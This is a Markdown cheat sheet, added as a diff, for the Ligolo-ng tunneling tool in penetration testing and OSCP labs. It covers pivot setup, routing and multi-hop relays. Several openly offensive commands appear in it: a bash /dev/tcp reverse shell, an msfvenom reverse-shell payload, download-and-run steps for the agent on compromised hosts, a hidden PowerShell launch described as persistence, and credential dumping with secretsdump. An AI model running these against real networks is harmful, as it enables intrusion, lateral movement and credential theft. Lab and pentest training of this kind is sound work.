@@ -1,0 +1,563 @@
+# Ligolo-ng Comprehensive Cheat Sheet
+> Fast, reliable tunneling for penetration testing and OSCP. Ligolo-ng creates a TUN interface on your attack box, making pivoting feel like you're directly on the target network — no SOCKS proxy, no proxychains needed.
+
+---
+
+## Table of Contents
+1. [How It Works](#how-it-works)
+2. [Architecture Overview](#architecture-overview)
+3. [Installation & Setup](#installation--setup)
+4. [Proxy (Attack Box) — All Flags](#proxy-attack-box--all-flags)
+5. [Agent (Target/Pivot Host) — All Flags](#agent-targetpivot-host--all-flags)
+6. [Proxy Interactive Console Commands](#proxy-interactive-console-commands)
+7. [Core Workflow — Step by Step](#core-workflow--step-by-step)
+8. [Practical Examples](#practical-examples)
+9. [Multi-Hop Pivoting](#multi-hop-pivoting)
+10. [Reverse Tunnels (Listeners)](#reverse-tunnels-listeners)
+11. [File Transfer via Ligolo](#file-transfer-via-ligolo)
+12. [Common OSCP Scenarios](#common-oscp-scenarios)
+13. [Troubleshooting](#troubleshooting)
+14. [Quick Reference Card](#quick-reference-card)
+
+---
+
+## How It Works
+
+Unlike Chisel/SOCKS5 proxies (which require proxychains and break many tools), Ligolo-ng creates a **real TUN network interface** on your attack machine. This means:
+
+- Tools work natively — nmap, crackmapexec, evil-winrm, impacket, etc.
+- No proxychains required
+- Full TCP/UDP support
+- DNS resolution works through the tunnel
+- Significantly faster than SOCKS proxying
+
+**The flow:**
+```
+[Attack Box] <--TLS tunnel-- [Pivot Host/Agent] <--> [Internal Network]
+     ^                              ^
+  runs proxy                   runs agent
+  (listener)               (connects outbound)
+```
+
+---
+
+## Architecture Overview
+
+| Component | Runs On | Role |
+|-----------|---------|------|
+| `proxy` | Your attack box (Kali) | Listens for agent connections, manages the TUN interface |
+| `agent` | Compromised pivot host | Connects back to proxy, relays traffic into internal network |
+
+The agent always **connects outward** to the proxy — this is firewall-friendly since most outbound traffic is allowed.
+
+---
+
+## Installation & Setup
+
+### Download Binaries
+```bash
+# Latest release from GitHub
+https://github.com/nicocha30/ligolo-ng/releases
+
+# Files you need:
+# proxy        → your Kali/attack box (Linux)
+# agent        → pivot host (Linux or Windows)
+# agent.exe    → pivot host (Windows)
+```
+
+### Build from Source (optional)
+```bash
+git clone https://github.com/nicocha30/ligolo-ng
+cd ligolo-ng
+go build -o proxy cmd/proxy/main.go
+go build -o agent cmd/agent/main.go
+
+# Cross-compile Windows agent from Linux:
+GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
+```
+
+### Create the TUN Interface (Attack Box — do this once per session)
+```bash
+# Create the interface
+sudo ip tuntap add user $USER mode tun ligolo
+
+# Bring it up
+sudo ip link set ligolo up
+
+# Verify
+ip addr show ligolo
+```
+
+---
+
+## Proxy (Attack Box) — All Flags
+
+```
+proxy [flags]
+```
+
+| Flag | Type | Default | Description |
+|------|------|---------|-------------|
+| `-laddr` | string | `0.0.0.0:11601` | Address and port the proxy listens on for incoming agent connections |
+| `-selfcert` | bool | false | Auto-generate a self-signed TLS certificate (easiest for CTF/OSCP use) |
+| `-certfile` | string | — | Path to a custom TLS certificate file (PEM format) |
+| `-keyfile` | string | — | Path to the private key file for the custom cert |
+| `-v` | bool | false | Verbose mode — shows detailed connection and tunnel info |
+| `-ignore-cert` | bool | false | Disable TLS certificate verification (use with agent's `-ignore-cert`) |
+
+### Proxy Usage Examples
+```bash
+# Most common — self-signed cert, default port
+sudo ./proxy -selfcert
+
+# Custom port (useful if 11601 is blocked)
+sudo ./proxy -selfcert -laddr 0.0.0.0:443
+
+# Verbose output for debugging
+sudo ./proxy -selfcert -v
+
+# Using a real cert (rare in CTF context)
+sudo ./proxy -certfile /path/to/cert.pem -keyfile /path/to/key.pem
+```
+
+---
+
+## Agent (Target/Pivot Host) — All Flags
+
+```
+agent [flags]
+```
+
+| Flag | Type | Default | Description |
+|------|------|---------|-------------|
+| `-connect` | string | — | **Required.** Address of the proxy to connect to (`ip:port`) |
+| `-ignore-cert` | bool | false | Skip TLS certificate verification — required when proxy uses `-selfcert` |
+| `-retry` | bool | false | Automatically retry connection if the proxy is unreachable |
+| `-sleep` | int | 0 | Sleep N seconds between retry attempts (use with `-retry`) |
+| `-v` | bool | false | Verbose mode |
+| `-bind` | string | — | Bind address for the agent (rarely needed) |
+
+### Agent Usage Examples
+```bash
+# Linux agent — connect back to attack box
+./agent -connect 10.10.14.5:11601 -ignore-cert
+
+# Windows agent (cmd or PowerShell)
+agent.exe -connect 10.10.14.5:11601 -ignore-cert
+
+# With auto-retry (useful if proxy isn't up yet)
+./agent -connect 10.10.14.5:11601 -ignore-cert -retry
+
+# Retry with delay between attempts
+./agent -connect 10.10.14.5:11601 -ignore-cert -retry -sleep 5
+
+# Custom port (must match proxy -laddr)
+./agent -connect 10.10.14.5:443 -ignore-cert
+
+# Verbose
+./agent -connect 10.10.14.5:11601 -ignore-cert -v
+```
+
+---
+
+## Proxy Interactive Console Commands
+
+Once an agent connects, you'll see the ligolo-ng console prompt. These are the commands available:
+
+### Session Management
+```
+session                    List all connected agents and their session IDs
+session                    (then select by number to switch to that session)
+```
+
+| Command | Description |
+|---------|-------------|
+| `session` | List all connected agent sessions with ID, hostname, and OS |
+| `session <id>` | Switch to/select a specific session |
+
+### Tunnel & Interface Commands
+```
+start                      Start the tunnel for the currently selected session
+stop                       Stop the active tunnel
+```
+
+| Command | Description |
+|---------|-------------|
+| `start` | Start routing traffic through the selected agent's tunnel via the ligolo TUN interface |
+| `stop` | Stop the active tunnel |
+| `tunnel_start` | Alias for start |
+| `tunnel_stop` | Alias for stop |
+
+### Network Information
+```
+ifconfig                   Show network interfaces on the agent (pivot) host
+```
+
+| Command | Description |
+|---------|-------------|
+| `ifconfig` | Lists all network interfaces and IP addresses visible to the agent — use this to discover internal subnets |
+
+### Listener Commands (Reverse Tunnels)
+```
+listener_add               Add a port forwarder/listener on the agent
+listener_list              List all active listeners
+listener_del               Delete a listener
+```
+
+| Command | Description |
+|---------|-------------|
+| `listener_add --addr <ip:port> --to <ip:port>` | Forward connections arriving at the agent on `addr` to `to` destination |
+| `listener_list` | Show all active listeners with their IDs |
+| `listener_del --id <id>` | Remove a listener by its ID |
+
+### Utility
+```
+help                       Show all available commands
+exit / quit                Exit the console (does not kill agents)
+```
+
+---
+
+## Core Workflow — Step by Step
+
+### Step 1 — Set Up TUN Interface (Attack Box, once per session)
+```bash
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+```
+
+### Step 2 — Start the Proxy (Attack Box)
+```bash
+sudo ./proxy -selfcert
+# Wait for: "INFO[0000] Listening on 0.0.0.0:11601"
+```
+
+### Step 3 — Transfer and Run Agent (Pivot Host)
+```bash
+# Transfer via whatever means available (wget, curl, SMB, SCP, etc.)
+# Then execute on the pivot host:
+./agent -connect <ATTACK_BOX_IP>:11601 -ignore-cert
+```
+
+### Step 4 — Select Session (Proxy Console)
+```
+ligolo-ng » session
+# Select the session number that appeared
+[Agent] 0 - PIVOTHOST\Administrator@PIVOTHOST - windows/amd64
+ligolo-ng » 0
+```
+
+### Step 5 — Check Internal Network (Proxy Console)
+```
+[Agent: PIVOTHOST] » ifconfig
+# Look for internal subnets you want to reach
+# e.g., 172.16.1.0/24
+```
+
+### Step 6 — Add Route (Attack Box, new terminal)
+```bash
+sudo ip route add 172.16.1.0/24 dev ligolo
+```
+
+### Step 7 — Start the Tunnel (Proxy Console)
+```
+[Agent: PIVOTHOST] » start
+# INFO[0000] Starting tunnel to PIVOTHOST...
+```
+
+### Step 8 — Access Internal Network Directly
+```bash
+# You can now hit internal hosts natively
+nmap -sV 172.16.1.0/24
+crackmapexec smb 172.16.1.0/24
+evil-winrm -i 172.16.1.10 -u administrator -p 'Password123'
+```
+
+---
+
+## Practical Examples
+
+### Example 1 — Basic Single Pivot
+**Scenario:** You've compromised 10.10.110.5, and it has access to internal subnet 192.168.1.0/24
+
+```bash
+# Attack box setup
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ./proxy -selfcert
+
+# On pivot host (10.10.110.5)
+./agent -connect 10.10.14.2:11601 -ignore-cert
+
+# Proxy console
+session → select 0
+ifconfig   # confirms 192.168.1.0/24 is visible
+
+# Attack box — new terminal
+sudo ip route add 192.168.1.0/24 dev ligolo
+
+# Proxy console
+start
+
+# Now attack 192.168.1.0/24 directly
+nmap -sCV -p- 192.168.1.10
+```
+
+---
+
+### Example 2 — Accessing a Specific Host Only
+```bash
+# If you just need one host, route only that host
+sudo ip route add 192.168.1.50/32 dev ligolo
+```
+
+---
+
+### Example 3 — Multiple Subnets from One Agent
+```bash
+# Agent can see multiple subnets
+sudo ip route add 10.20.0.0/24 dev ligolo
+sudo ip route add 172.16.5.0/24 dev ligolo
+# Both are now routable through the same tunnel
+```
+
+---
+
+### Example 4 — Windows Pivot Host, Running Agent as Service (Persistence)
+```powershell
+# Run as a background job in PowerShell
+Start-Process -WindowStyle Hidden .\agent.exe -ArgumentList "-connect 10.10.14.2:11601 -ignore-cert -retry"
+```
+
+---
+
+### Example 5 — Transferring the Agent via HTTP
+```bash
+# Attack box — serve the agent
+cd /path/to/agent/
+python3 -m http.server 8080
+
+# On Linux pivot host
+wget http://10.10.14.2:8080/agent -O /tmp/agent
+chmod +x /tmp/agent
+/tmp/agent -connect 10.10.14.2:11601 -ignore-cert
+
+# On Windows pivot host (PowerShell)
+Invoke-WebRequest -Uri http://10.10.14.2:8080/agent.exe -OutFile C:\Windows\Temp\agent.exe
+C:\Windows\Temp\agent.exe -connect 10.10.14.2:11601 -ignore-cert
+```
+
+---
+
+## Multi-Hop Pivoting
+
+**Scenario:** You need to reach a third network through two pivot hosts.
+
+```
+[Kali] → [Pivot1: 10.10.110.5] → [Pivot2: 192.168.1.20] → [Target: 172.16.0.0/24]
+```
+
+### Step 1 — Establish first tunnel to Pivot1
+```bash
+# Kali setup (already done from before)
+# Agent running on Pivot1, tunnel started, route to 192.168.1.0/24 added
+sudo ip route add 192.168.1.0/24 dev ligolo
+# start tunnel in console
+```
+
+### Step 2 — Set up listener on Pivot1 to relay agent connections
+```
+# In proxy console (with Pivot1 session selected):
+[Agent: Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
+# This makes Pivot1 listen on :11601 and relay to Kali's proxy
+```
+
+### Step 3 — Run agent on Pivot2, connecting via Pivot1
+```bash
+# On Pivot2 (192.168.1.20):
+./agent -connect 192.168.1.5:11601 -ignore-cert
+# Pivot2 connects to Pivot1's listener, which relays to Kali's proxy
+```
+
+### Step 4 — New session appears in proxy console
+```
+session   # Pivot2 should now appear as a second session
+# Select Pivot2 session
+ifconfig  # Check what Pivot2 can see — should show 172.16.0.0/24
+```
+
+### Step 5 — Add route and start second tunnel
+```bash
+# Kali terminal
+sudo ip route add 172.16.0.0/24 dev ligolo
+
+# Proxy console (Pivot2 session selected)
+start
+```
+
+Now you can hit 172.16.0.0/24 directly from Kali.
+
+---
+
+## Reverse Tunnels (Listeners)
+
+Listeners let the **agent** forward ports back to your attack box — useful for catching reverse shells from deeper in the network.
+
+### Catching a Reverse Shell from an Internal Host
+
+**Scenario:** You exploited something on 172.16.0.50 (deep internal), and need a reverse shell back to Kali.
+
+```
+# Step 1 — Set up listener on the pivot agent
+# (Pivot is 192.168.1.5, Kali is 10.10.14.2)
+[Agent: Pivot1] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
+
+# Step 2 — Start netcat on Kali
+nc -lvnp 4444
+
+# Step 3 — Trigger reverse shell on internal host pointing to Pivot
+# The internal host connects to 192.168.1.5:4444
+# Pivot forwards that connection to Kali:4444
+bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
+```
+
+### Managing Listeners
+```
+listener_list              # See all active listeners and their IDs
+listener_del --id 0        # Delete listener with ID 0
+```
+
+---
+
+## File Transfer via Ligolo
+
+Once the tunnel is active, you can serve files directly to internal hosts:
+
+```bash
+# Kali — serve files
+python3 -m http.server 8080
+
+# From an internal host (once routed through tunnel)
+# The internal host needs to reach Kali's IP — add a route on Kali first:
+sudo ip route add <internal_subnet> dev ligolo
+
+# But for internal hosts to reach Kali, use a listener:
+[Agent: Pivot1] » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080
+
+# Now internal host can download from Pivot1:8080 which forwards to Kali:8080
+wget http://192.168.1.5:8080/linpeas.sh
+```
+
+---
+
+## Common OSCP Scenarios
+
+### Scenario A — AD Lateral Movement Through Pivot
+```bash
+# Route internal AD subnet through tunnel
+sudo ip route add 10.10.120.0/24 dev ligolo
+
+# BloodHound collection from Kali directly
+bloodhound-python -u 'user' -p 'pass' -ns 10.10.120.10 -d corp.local -c all
+
+# CrackMapExec across the internal subnet
+crackmapexec smb 10.10.120.0/24 -u administrator -p 'Password123'
+
+# Evil-WinRM to internal DC
+evil-winrm -i 10.10.120.10 -u administrator -H <NTLM_HASH>
+
+# Impacket tools work natively
+secretsdump.py corp.local/administrator:'Password123'@10.10.120.10
+psexec.py corp.local/administrator:'Password123'@10.10.120.10
+```
+
+### Scenario B — Internal Web App Access
+```bash
+# Route the host
+sudo ip route add 10.10.120.50/32 dev ligolo
+
+# Hit internal web apps directly in your browser
+# Just browse to http://10.10.120.50 — no proxy config needed
+curl -s http://10.10.120.50/admin
+```
+
+### Scenario C — Catching a Shell from Deep Network
+```bash
+# Add listener on pivot to relay shells back to Kali
+listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001
+
+# Start handler on Kali
+nc -lvnp 9001
+# OR msfconsole handler on port 9001
+
+# Payload points to pivot host IP, not Kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=9001 -f exe -o shell.exe
+```
+
+---
+
+## Troubleshooting
+
+| Problem | Cause | Fix |
+|---------|-------|-----|
+| Agent connects but no traffic routes | Route not added on attack box | `sudo ip route add <subnet> dev ligolo` |
+| TUN interface missing | Not created yet | `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up` |
+| TLS handshake error | Cert mismatch | Add `-ignore-cert` to agent command |
+| Agent immediately disconnects | Firewall blocking outbound | Try `-connect <ip>:443` — port 443 is almost always allowed outbound |
+| nmap not working through tunnel | nmap needs raw sockets or TCP scan | Use `-sT` (TCP connect scan) instead of default SYN scan: `nmap -sT -Pn` |
+| Can't ping through tunnel | ICMP not fully supported | Skip ping, go straight to port scans: `nmap -Pn` |
+| Multiple sessions — wrong tunnel | Wrong session selected | `session` to list, then select correct one before `start` |
+| Route conflict | Existing route for same subnet | `ip route del <subnet>` then re-add via ligolo |
+
+### nmap Through Ligolo — Important Note
+```bash
+# Standard SYN scan (-sS) requires raw sockets and MAY not work
+# Always use TCP connect scan through the tunnel:
+nmap -sT -Pn -p- 192.168.1.10
+
+# For host discovery across a subnet:
+nmap -sT -Pn 192.168.1.0/24
+
+# Service/version scan:
+nmap -sT -sV -sC -Pn -p 22,80,443,445,3389 192.168.1.10
+```
+
+---
+
+## Quick Reference Card
+
+```
+=== ATTACK BOX SETUP (once per session) ===
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+sudo ./proxy -selfcert
+
+=== ADD ROUTE (per subnet to reach) ===
+sudo ip route add <SUBNET/CIDR> dev ligolo
+
+=== AGENT ON PIVOT HOST ===
+./agent -connect <KALI_IP>:11601 -ignore-cert           # Linux
+agent.exe -connect <KALI_IP>:11601 -ignore-cert         # Windows
+
+=== PROXY CONSOLE ===
+session           → list/select agents
+ifconfig          → discover internal subnets on pivot
+start             → start tunnel
+stop              → stop tunnel
+listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT>  → reverse port forward
+listener_list     → show all listeners
+listener_del --id <ID>  → remove listener
+
+=== NMAP THROUGH TUNNEL ===
+nmap -sT -Pn -p- <TARGET>
+
+=== MULTI-HOP ===
+1. Tunnel to Pivot1, add route to Pivot1's subnet
+2. listener_add on Pivot1 to relay :11601 → 127.0.0.1:11601
+3. Run agent on Pivot2 connecting to Pivot1's IP:11601
+4. New session appears, add route to Pivot2's subnet, start tunnel
+```
+
+---
+
+*Ligolo-ng GitHub: https://github.com/nicocha30/ligolo-ng*
